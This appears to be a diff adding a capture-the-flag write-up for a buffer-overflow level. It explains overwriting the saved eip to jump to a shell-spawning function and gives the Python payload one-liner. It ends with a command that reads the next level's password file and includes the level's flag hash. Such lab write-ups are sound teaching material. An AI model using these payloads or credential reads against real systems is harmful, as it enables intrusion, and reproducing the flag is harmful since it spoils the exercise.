@@ -1,0 +1,16 @@
+flag: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+buffer is 76 bytes. Next to them is ebp then eip, registers that had been pushed
+to the stack to store them. eip is the register that stocks the adress of the next
+instruction. If we write over eip our own adress, we can choose an adress to go
+rather than to the end of the program.
+
+Now if we decompile the program with ghidra, we find a run function that executes a shell. We just have to use the adress of the start of the function and put it in the payload.
+address: 08048444 => write in little endian with \x before every byte.
+
+(python -c 'print "A"*76+"\x44\x84\x04\x08"'; cat) | ./level1
+
+the '; cat' is a little hack to keep the pipe open, because after reading the result of
+the python script, level1 closes the pipe and we do not have access to stdin anymore.
+
+> cat /home/user/level2/.pass
